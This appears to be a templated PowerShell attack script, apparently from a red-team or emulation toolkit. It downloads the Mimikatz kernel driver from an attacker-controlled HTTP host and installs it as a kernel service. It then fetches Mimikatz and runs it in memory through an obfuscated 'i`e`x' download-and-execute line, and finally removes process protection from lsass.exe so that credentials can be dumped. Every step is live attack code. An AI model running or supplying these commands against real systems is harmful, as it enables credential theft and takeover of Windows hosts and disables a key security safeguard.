Write-Output "[*] Download drv to {{save_path}}{{mimidrv}}"
iwr "http://{{http_ip}}:{{http_port}}/{{mimidrv}}" -OutFile "{{save_path}}{{mimidrv}}"

Write-Output "[*] Create and run service"
cmd.exe /c "sc create {{service_name}} binPath= {{save_path}}{{mimidrv}} type= kernel start= demand"
cmd.exe /c "sc start {{service_name}}"

Write-Output "[*] Import mkz.ps1"
i`e`x(iWr -UsEbaSIcparSING http://{{http_ip}}:{{http_port}}/{{mimikatz}});

Write-Output "[*] Disable PPL"
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""